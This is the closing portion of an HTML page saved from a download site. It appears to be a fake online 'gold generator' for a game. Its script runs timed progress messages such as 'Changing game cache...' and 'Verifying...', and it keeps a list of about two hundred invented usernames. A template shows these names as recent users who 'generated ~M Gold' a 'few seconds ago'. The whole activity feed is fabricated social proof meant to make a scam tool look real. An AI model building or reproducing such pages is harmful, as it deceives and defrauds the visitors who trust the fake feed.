        },
        {
            message:'Changing game cache...',
            time:400,
            type: "task"
        },
        {
            message:'Verifying...',
            time:2200,
            type: "task"
        },
    ];
    var usernames=["loyalgill",
        "bankerdisgusting",
        "ingestionhorizon",
        "meiniepages",
        "dissniobium",
        "financialsfowl",
        "admonishzero",
        "woundsjazzy",
        "blockinteger",
        "wickerwindbag",
        "eyepiecestair",
        "worthbawl",
        "flagmanx",
        "puddingshassium",
        "amusingnavier",
        "consideredfrequency",
        "grudgingdecorate",
        "versionrefer",
        "rubberymutton",
        "chipbolide",
        "dashcubemoaning",
        "nurturingbutties",
        "muscletyped",
        "routesbauble",
        "bonyecotone",
        "bulbssection",
        "blissfulunlock",
        "erasenosed",
        "cheepingweatherly",
        "delayedpast",
        "custardstallion",
        "walkingstraps",
        "transitionsupernova",
        "dentalexpand",
        "gatetriathlon",
        "trialsblack",
        "coinedgrudging",
        "masculinestaff",
        "allergyfluctus",
        "platestaffrail",
        "bunsbabies",
        "unfriendlyimport",
        "dentedcontend",
        "derisiondiagnostic",
        "satsweets",
        "defenseattracted",
        "brentrotten",
        "swollenslideshare",
        "tumblrmoldwarp",
        "whimbreligneous",
        "gregariouscheck",
        "exxonmicrosoft",
        "adjacentamuck",
        "editmeadowlark",
        "patternsint",
        "ragefilledyield",
        "maphatch",
        "kindlebreccia",
        "disccathode",
        "sedgeforget",
        "snowgeek",
        "unlockrotator",
        "exaltedlawful",
        "filmvisits",
        "confirmedok",
        "pissedarmy",
        "swarm3puking",
        "practisedhigh",
        "upstagemacqueen",
        "smoggynevis",
        "trojanskinny",
        "quacklondon",
        "balmerdrill",
        "bravaisclaws",
        "igloobarber",
        "stiltcloning",
        "mugwumpresolves",
        "clapperblueberry",
        "taskslisteners",
        "hounduseful",
        "recentcornice",
        "hookedpizza",
        "mornang",
        "platesky",
        "itchingcardamom",
        "liftedlet",
        "ambivalentpatisserie",
        "meteoroidbook",
        "awakewhoop",
        "fiddleinquiry",
        "stringparrel",
        "dicedmongoose",
        "lovesickagnost",
        "performershelduck",
        "stoicdiscover",
        "pluggeorgian",
        "berylliumabundant",
        "cratedazzling",
        "starmagnitude",
        "maniacalsnouted",
        "ioxhostclipclop",
        "tiemetatarsal",
        "concernsomega",
        "rigidwalking",
        "floorwestern",
        "wilsonultraviolet",
        "frigidgithub",
        "cysticequine",
        "choruseshafnium",
        "ridgegrown",
        "culminationlottery",
        "starstug",
        "catalystsbrecon",
        "tonghandler",
        "molecularstarbucks",
        "alluvialdisease",
        "burstuncertainty",
        "molassehedge",
        "foxflats",
        "medalpigjump",
        "macaroonvillain",
        "marefizz",
        "occasionalterry",
        "perkylyme",
        "drizzleticktock",
        "nonchalantwalker",
        "armiraqi",
        "acousticcassiopeia",
        "soupfaraway",
        "tailordot",
        "garboardcheater",
        "habergrouch",
        "paperclipcareers",
        "musclessecondhand",
        "iodineassociate",
        "jackstaffcriticize",
        "lichenlighten",
        "inherentmeh",
        "diphthongmerchant",
        "edgygaggle",
        "memberradiant",
        "examplehovers",
        "heptagonplus",
        "conferenceemail",
        "wantenchanting",
        "laughingexperts",
        "complaineddover",
        "victoriamake",
        "vernacularrink",
        "sternwaytranship",
        "lockreliable",
        "nescafevenezuelan",
        "therapistlift",
        "instagramtart",
        "frequentprobably",
        "lawyermartingale",
        "sipdermis",
        "strugglingarchean",
        "acidoptician",
        "morbiditystiff",
        "overflowwomba",
        "forelockinitial",
        "wonmeatballs",
        "trainingfrothy",
        "kestreltrained",
        "terekmultiple",
        "helpingmate",
        "leukemiasparc",
        "voltaestuary",
        "pickyovenbird",
        "meatheadtonic",
        "shalebaguette",
        "faultyfermat",
        "grinunwashed",
        "jurassiccontrol",
        "deciphernaughty",
        "dollopsmall",
        "testingprocess",
        "hydrogendecisive",
        "grillfocused",
        "swordmoonraker",
        "snuffledamsire",
        "greylagasparagus",
        "moneywhale",
        "printfixes",
        "warnindian",
        "fluctuspilchard",
        "thoroughspiral",
        "canespyramid",
        "shrikemap",
        "lacesgrandiose",
        "shutdownconvex",
        "identitylistless",
        "alarmedforgetful",
        "carpalarchery",
        "displacepuzzling",
        "zerosparrow",
        "gutturalpulp",
        "leeboardcoding",
        "developshrill"]
</script>
<div id="historyTemplate" style="display: none;">
    <li class="list-group-item">
        <div class="media">
            <div class="media-left media-middle">
                <i class="material-icons md-36 text-muted">%icon%</i>
            </div>
            <div class="media-body">
                <p class="m-a-0">
                    <a href="#">%username%</a> generated <a href="#">~%amount%M Gold</a>
                </p>
                <small class="text-muted">
                    %badge%

                    <i class="material-icons md-18">timer</i> <span class="icon-text"> few seconds ago</span>
                </small>
            </div>
        </div>
    </li>
</div>
<div id="checkmark" style="display: none;">
    <div class="sa-icon sa-success animate" style="display: block;">
        <span class="sa-line sa-tip animateSuccessTip"></span>
        <span class="sa-line sa-long animateSuccessLong"></span>

        <div class="sa-placeholder"></div>
        <div class="sa-fix"></div>
    </div>
</div>
</body>

<!-- Mirrored from dwnlds.co/2963daa by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 08 Jun 2019 17:20:31 GMT -->
</html>
